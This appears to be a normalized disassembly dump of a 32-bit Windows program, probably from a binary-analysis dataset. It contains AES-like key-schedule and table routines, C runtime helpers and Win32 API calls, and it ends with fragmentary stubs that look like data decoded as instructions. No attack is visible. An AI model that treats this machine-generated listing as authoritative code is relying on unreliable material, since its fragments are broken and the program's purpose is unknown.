mov [ edi + 0x18 ] ecx
mov [ edi + 0x1c ] edx
xor ecx ecx
jmp r-xdata
mov eax 0xfffffffe
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ edi + 0x48 ] 0xc
xor eax eax
jmp r-xdata
inc ecx
xor eax [ edi + 0x10 ]
mov [ edi + 0x28 ] eax
xor eax [ edi + 0x14 ]
mov [ edi + 0x2c ] eax
add edi 0x18
jmp r-xdata
mov eax [ edi ]
movzx esi dl
mov ebx [ ebp + esi * 8 + 0x2 ]
movzx esi dh
and ebx 0xff000000
xor eax ebx
mov ebx [ ebp + esi * 8 + 0x2 ]
shr edx 0x10
and ebx 0xff
movzx esi dl
xor eax ebx
mov ebx [ ebp + esi * 8 ]
movzx esi dh
and ebx 0xff00
xor eax ebx
mov ebx [ ebp + esi * 8 ]
and ebx 0xff0000
xor eax ebx
xor eax [ ebp + ecx * 4 + 0x800 ]
mov [ edi + 0x20 ] eax
xor eax [ edi + 0x4 ]
mov [ edi + 0x24 ] eax
xor eax [ edi + 0x8 ]
mov [ edi + 0x28 ] eax
xor eax [ edi + 0xc ]
mov [ edi + 0x2c ] eax
cmp ecx 0x6
je r-xdata
mov eax [ edi ]
mov edx [ edi + 0x14 ]
mov [ edi + 0x30 ] 0xe
xor eax eax
jmp r-xdata
inc ecx
mov edx eax
mov eax [ edi + 0x10 ]
movzx esi dl
mov ebx [ ebp + esi * 8 + 0x2 ]
movzx esi dh
and ebx 0xff
xor eax ebx
mov ebx [ ebp + esi * 8 ]
shr edx 0x10
and ebx 0xff00
movzx esi dl
xor eax ebx
mov ebx [ ebp + esi * 8 ]
movzx esi dh
and ebx 0xff0000
xor eax ebx
mov ebx [ ebp + esi * 8 + 0x2 ]
and ebx 0xff000000
xor eax ebx
mov [ edi + 0x30 ] eax
xor eax [ edi + 0x14 ]
mov [ edi + 0x34 ] eax
xor eax [ edi + 0x18 ]
mov [ edi + 0x38 ] eax
xor eax [ edi + 0x1c ]
mov [ edi + 0x3c ] eax
add edi 0x20
jmp r-xdata
mov edx [ edi + 0x1c ]
sub_410780
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0xc ]
sub esp 0xc
mov [ esp ] eax
mov [ esp + 0x4 ] ecx
mov [ esp + 0x8 ] edx
call sub_4104d2
add esp 0xc
cmp eax 0x0
je r-xdata
push ebp
push ebx
push esi
push edi
mov esi [ esp + 0x1c ]
mov ecx [ esi + 0xf0 ]
lea ecx [ ecx * 4 ]
lea edi [ esi + ecx * 4 ]
retn
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov ecx [ edi ]
mov edx [ edi + 0x4 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ esi ] ecx
mov [ esi + 0x4 ] edx
mov eax [ esi + 0x8 ]
mov ebx [ esi + 0xc ]
mov ecx [ edi + 0x8 ]
mov edx [ edi + 0xc ]
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
add esi 0x10
sub edi 0x10
cmp esi edi
jne r-xdata
call $+5
pop ebp
lea edi [ ebp - 0x10bb ]
lea ebp [ ebp - 0x1bbb ]
mov esi [ esp + 0x1c ]
mov ecx [ esi + 0xf0 ]
dec ecx
nop
add esi 0x10
mov eax [ esi ]
mov edx eax
movzx ebx ah
shr edx 0x10
and eax 0xff
movzx eax [ ebp + eax * 8 + 0x2 ]
movzx ebx [ ebp + ebx * 8 + 0x2 ]
mov eax [ edi + eax * 8 ]
xor eax [ edi + ebx * 8 + 0x3 ]
movzx ebx dh
and edx 0xff
movzx edx [ ebp + edx * 8 + 0x2 ]
movzx ebx [ ebp + ebx * 8 + 0x2 ]
xor eax [ edi + edx * 8 + 0x2 ]
xor eax [ edi + ebx * 8 + 0x1 ]
mov [ esi ] eax
mov eax [ esi + 0x4 ]
mov edx eax
movzx ebx ah
shr edx 0x10
and eax 0xff
movzx eax [ ebp + eax * 8 + 0x2 ]
movzx ebx [ ebp + ebx * 8 + 0x2 ]
mov eax [ edi + eax * 8 ]
xor eax [ edi + ebx * 8 + 0x3 ]
movzx ebx dh
and edx 0xff
movzx edx [ ebp + edx * 8 + 0x2 ]
movzx ebx [ ebp + ebx * 8 + 0x2 ]
xor eax [ edi + edx * 8 + 0x2 ]
xor eax [ edi + ebx * 8 + 0x1 ]
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx eax
movzx ebx ah
shr edx 0x10
and eax 0xff
movzx eax [ ebp + eax * 8 + 0x2 ]
movzx ebx [ ebp + ebx * 8 + 0x2 ]
mov eax [ edi + eax * 8 ]
xor eax [ edi + ebx * 8 + 0x3 ]
movzx ebx dh
and edx 0xff
movzx edx [ ebp + edx * 8 + 0x2 ]
movzx ebx [ ebp + ebx * 8 + 0x2 ]
xor eax [ edi + edx * 8 + 0x2 ]
xor eax [ edi + ebx * 8 + 0x1 ]
mov [ esi + 0x8 ] eax
mov eax [ esi + 0xc ]
mov edx eax
movzx ebx ah
shr edx 0x10
and eax 0xff
movzx eax [ ebp + eax * 8 + 0x2 ]
movzx ebx [ ebp + ebx * 8 + 0x2 ]
mov eax [ edi + eax * 8 ]
xor eax [ edi + ebx * 8 + 0x3 ]
movzx ebx dh
and edx 0xff
movzx edx [ ebp + edx * 8 + 0x2 ]
movzx ebx [ ebp + ebx * 8 + 0x2 ]
xor eax [ edi + edx * 8 + 0x2 ]
xor eax [ edi + ebx * 8 + 0x1 ]
mov [ esi + 0xc ] eax
dec ecx
jne r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_401170
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
imul eax eax 0x3
pop ebp
retn
sub_4021a0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_404af0
add esp 0x8
pop ebp
retn
sub_402660
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov esp ebp
pop ebp
retn
sub_403730
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
call sub_4031e0
mov esp ebp
pop ebp
retn 0x4
sub_403750
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
call sub_402dc0
mov esp ebp
pop ebp
retn 0x4
sub_403770
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
call sub_402d00
mov esp ebp
pop ebp
retn 0x4
sub_403790
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
call sub_402b20
mov esp ebp
pop ebp
retn 0x4
sub_403c90
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_403c30
add esp 0xc
pop ebp
retn
sub_4046e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov esp ebp
pop ebp
retn
sub_404700
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4046e0
mov esp ebp
pop ebp
retn
sub_404760
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call [ EnterCriticalSection@IAT ]
mov esp ebp
pop ebp
retn
sub_4047a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call [ LeaveCriticalSection@IAT ]
mov esp ebp
pop ebp
retn
sub_4047c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call sub_4047a0
mov esp ebp
pop ebp
retn
sub_40496c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_404fa5
sub_404977
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_405655
sub_404982
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_405a58
pop ecx
retn
sub_404ab4
mov edi edi
push ebp
mov ebp esp
call sub_406b90
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_404ac6
call sub_406b90
mov ecx eax
mov eax [ ecx + 0x14 ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ ecx + 0x14 ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_404b76
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_407159
add esp 0xc
pop ebp
retn
sub_404b8c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_404b76
sub_404cd8
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404c61
add esp 0x14
pop ebp
retn
sub_404e12
call sub_408009
retn
sub_404e18
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404ddc
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_404f54
mov [ ecx ] r--data
jmp sub_40855c
sub_404f86
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40858e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40520d
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_4099e4
pop ecx
pop ecx
retn
sub_405221
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_40827b
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_4082f5
retn
push eax
call sub_408256
_start
call sub_40a205
jmp sub_4050de
sub_40574a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405abf
push 0xe
call sub_40a5eb
pop ecx
retn
sub_4069e9
call [ TlsAlloc@IAT ]
retn 0x4
sub_406b05
push 0xd
call sub_40a5eb
pop ecx
retn
sub_406b0e
push 0xc
call sub_40a5eb
pop ecx
retn
sub_406cc4
push 0xd
call sub_40a5eb
pop ecx
retn
sub_406cd0
push 0xc
call sub_40a5eb
pop ecx
retn
sub_407fe8
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_407fbd
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_408000
push 0x8
call sub_40a6c4
pop ecx
retn
sub_408009
push 0x8
call sub_40a5eb
pop ecx
retn
sub_40822b
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_40a5eb
pop ecx
sub_408240
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_408100
add esp 0xc
pop ebp
retn
sub_408256
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_408100
add esp 0xc
pop ebp
retn
sub_40826c
push 0x1
push 0x0
push 0x0
call sub_408100
add esp 0xc
retn
sub_40827b
push 0x1
push 0x1
push 0x0
call sub_408100
add esp 0xc
retn
sub_40828a
mov edi edi
push ebp
mov ebp esp
call sub_4099ab
push [ ebp + 0x8 ]
call sub_4097fc
pop ecx
push 0xff
call sub_408256
int3
sub_4082f5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_40849f
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_4084bc
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_408509
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_405655
pop ecx
sub_40855c
mov [ ecx ] r--data
jmp sub_408509
sub_4085b3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4097c8
push sub_409786
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_40a1e7
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_40a3a3
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_40a4b9
and [ rw-data ] 0x0
retn
sub_40a5eb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40a6bb
push 0xa
call sub_40a5eb
pop ecx
retn
sub_40a7d6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_40a700
add esp 0xc
pop ebp
retn 0x4
sub_40a809
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_40d445
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40a83b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_40a700
add esp 0xc
pop ebp
retn 0x8
sub_40a9b7
push [ ebp + 0x8 ]
call sub_40d5f5
pop ecx
retn
sub_40b18a
push ebx
call sub_40d5f5
pop ecx
retn
sub_40b231
mov eax rw-data
retn
sub_40b2e8
call sub_40d8b1
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_405655
pop ecx
retn
call sub_40d68b
sub_40b6ca
push 0xd
call sub_40a5eb
pop ecx
retn
sub_40ba99
push 0xd
call sub_40a5eb
pop ecx
retn
sub_40bad2
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_40b938
pop ecx
mov [ rw-data ] 0x1
sub_40be1d
push 0xc
call sub_40a5eb
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_40be4c
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_40bfb7
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40be62
add esp 0x14
pop ebp
retn
sub_40c00c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40bfd4
pop ecx
pop ecx
pop ebp
retn
sub_40c2b1
push 0x8
push r--data
call sub_4082b0
call sub_406b90
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40de40
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_40c2d1
xor eax eax
inc eax
retn
sub_40c2ea
push sub_40c2b1
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_40c2fb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_40c350
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_40c4c4
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_40a5eb
pop ecx
sub_40c500
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40c50f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40c63b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_40cb0b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c9f5
add esp 0x10
pop ebp
retn
sub_40cee3
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_40ce90
add esp 0x10
pop ebp
retn
sub_40d419
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40d350
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40d464
call eax
retn
sub_40d5ec
push 0xa
call sub_40a5eb
pop ecx
retn
sub_40d71e
push 0x1
call sub_40a5eb
pop ecx
retn
sub_40d879
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_40b3b7
pop ecx
pop ecx
retn
sub_40d8a8
push 0x1
call sub_40a5eb
pop ecx
retn
sub_40d8b1
push 0x1
call sub_40d7d7
pop ecx
retn
sub_40dd98
push 0x2
call sub_40828a
sub_40e518
push ebx
call sub_40d5f5
pop ecx
retn
sub_40e520
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40d660
sub_40e536
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40d660
sub_40e54c
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_40e56b
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_40e65b
push esi
call sub_40b37b
pop ecx
retn
sub_40e734
push ebx
call sub_40d5f5
pop ecx
retn
sub_40e894
push ebx
call sub_40d5f5
pop ecx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_40ecc5
0x45ca
sub_40ed8c
push ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
hlt
sub_40edda
retn
sub_40eddb
pop esi
popfd
retn
sub_40edde
retn
sub_40ef09

sub_40ef0a

sub_40ef0d

sub_40ef0e

sub_40ef3b
dec edx
test edi ecx
iretd
sub_40f059
in al dx
in al dx
das
retn
sub_40f740
push ecx
hlt
sub_410920
push ebp
mov ebp esp
mov ecx rw-data
call sub_402660
pop ebp
retn
sub_410930
push ebp
mov ebp esp
mov ecx rw-data
call sub_404700
pop ebp
retn
sub_410940
push ebp
mov ebp esp
mov ecx rw-data
call sub_402660
pop ebp
retn
sub_41094f
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_40855c
